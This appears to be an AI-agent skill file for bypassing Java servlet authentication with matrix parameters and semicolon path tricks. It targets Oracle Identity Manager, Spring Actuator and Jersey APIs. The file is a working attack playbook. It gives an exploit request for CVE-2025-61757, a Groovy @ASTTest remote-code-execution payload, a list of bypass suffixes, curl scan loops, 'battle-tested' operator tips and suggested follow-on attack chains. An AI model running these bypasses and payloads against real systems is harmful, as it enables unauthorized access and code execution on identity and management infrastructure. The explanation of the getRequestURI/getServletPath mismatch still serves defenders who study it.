---
name: java-matrix-param-bypass
description: "Bypass Java servlet authentication filters with matrix parameters and path-segment tricks (;.wadl, ;/, /..;/) where getRequestURI and getServletPath disagree, reaching Spring Actuator, Jersey/JAX-RS routes, and Oracle IDM Groovy RCE. Use when a Java/Spring/Tomcat target enforces authorization with regex or prefix-matching filters and protected paths return 403."
---

# Java Matrix Parameter Authentication Bypass

## Crown Jewel Targets

- Oracle Identity Manager (OIM) — Groovy @ASTTest compile-time RCE
- Spring Boot Actuator endpoints behind security filters
- Jersey/JAX-RS APIs with regex-based auth filters
- Oracle WebLogic console and management endpoints
- Java enterprise apps using `getRequestURI()` for auth decisions
- Any Java app whitelisting `.wadl`, `.wsdl`, `.xsd`, `.css` extensions

## Attack Surface Signals

- JSESSIONID cookies, Java-style error pages
- URL patterns: `/api/v1/`, `/iam/governance/`, `/admin/`, `/actuator/`
- `.wadl`, `.wsdl` documentation endpoints accessible
- Spring Boot indicators: `/actuator/health`, structured JSON errors
- Oracle IDM paths: `/iam/governance/adminservice/`, `/iam/governance/selfservice/`

**Sources:** SLCyber (Oracle Identity Manager CVE-2025-61757, 2025), Orange Tsai (MobileIron, 2020)
**Key CVEs:** CVE-2025-61757, CVE-2020-15505

## Overview

Java servlet containers treat semicolons in URLs as matrix parameter separators. Security filters often use `getRequestURI()` which includes matrix parameters, while servlet routing strips them. This creates a mismatch exploitable for authentication bypass.

## Core Technique

```
# Security filter checks: /api/v1/admin;.wadl  
#   → matches regex \.wadl$ → whitelisted, no auth
# Servlet routing strips: /api/v1/admin
#   → routes to admin endpoint without authentication
```

## Oracle Identity Manager Pattern

```bash
# Auth bypass via ;.wadl suffix
POST /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl

# SecurityFilter regex bypass:
# Pattern: \.[wW][aA][dD][lL](.)*\z  matches → skip auth
# Servlet: strips ;.wadl → routes to groovyscriptstatus

# Alternative: ?WSDL query string
POST /iam/governance/.../groovyscriptstatus?WSDL
```

RCE via Groovy `@ASTTest` compile-time annotation:
```groovy
@groovy.transform.ASTTest(phase=org.codehaus.groovy.control.CompilePhase.SEMANTIC_ANALYSIS, value={
    assert java.lang.Runtime.getRuntime().exec("id")
})
def x
```

## Common Bypass Suffixes

```
;.wadl         # WADL description whitelist
;.wsdl         # WSDL description whitelist
;.xsd          # Schema whitelist
;.css          # Static resource whitelist
;.js           # Static resource whitelist
;.png          # Image whitelist
;.ico          # Favicon whitelist
;x=1           # Generic matrix param
```

## Variant: Semicolon Path Confusion

```bash
# Tomcat context escape (see tomcat-path-normalization-bypass.md)
/app/..;/admin/

# Spring Boot actuator bypass
/actuator;/health  # Filter sees /actuator;/health, Spring routes to /actuator/health

# Jersey/JAX-RS path matching
/api/v1/users;role=admin/profile  # Matrix params in path segments
```

## Detection

```bash
# Test matrix parameter bypass
for ext in .wadl .wsdl .xsd .css .js .png .ico; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target/admin;$ext")
    echo "$ext: $code"
done

# Test generic semicolon bypass
curl -sk "https://target/admin;x=1" -o /dev/null -w "%{http_code}"

# Check if getRequestURI vs getServletPath differ
curl -sk "https://target/api;test/endpoint"
```

## REST Context Roots to Test (Oracle IDM)

```
/iam/governance/adminservice/
/iam/governance/configmgmt/
/iam/governance/applicationmanagement/
/iam/governance/selfservice/
```

## Bug Bounty Relevance

- **CRITICAL**: Affects many Java enterprise applications
- Oracle products, Spring Boot apps, Jersey/JAX-RS APIs all potentially vulnerable
- Security filters using regex on full URI are bypassed by matrix parameters
- Combine with Groovy @ASTTest for compile-time RCE where Groovy endpoints exist
- Trivial to test, high impact, frequently overlooked

## Operator Notes (Battle-Tested)

- **Test ALL extension suffixes**: Loop through `;.wadl`, `;.wsdl`, `;.xsd`, `;.css`, `;.js`, `;.png`, `;.ico` on every protected Java endpoint. One will match the filter's whitelist regex.
- **`getRequestURI()` vs `getServletPath()`**: Security filter uses `getRequestURI()` which INCLUDES matrix params. Servlet routing uses `getServletPath()` which STRIPS them. This mismatch is the entire bug.
- **Groovy @ASTTest is compile-time RCE**: Works on ANY endpoint that parses Groovy (Oracle IDM groovyscriptstatus). No `execute()` needed — code runs during AST compilation.
- **Actuator bypass**: `/actuator;/health` — filter sees `/actuator;/health`, Spring routes to `/actuator/health`. Simple, devastating.
- **Combine with path normalization**: `;.wadl` for auth bypass + `..;/` for context escape = double bypass.
- **Generic `;x=1` works too**: When specific extension whitelists fail, try generic matrix parameters.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `server-confusion-attacks` → `references/tomcat-path-normalization-bypass.md` | Complementary `..;/` context escape |
| `server-confusion-attacks` | Proxy-level path confusion |
| `spring-el-injection` | EL injection after auth bypass |
| `deserialization-testing` → `references/java-hessian-deserialization.md` | Deser on reached service endpoints |
| `jenkins-rce` | Similar auth bypass via whitelisted paths |
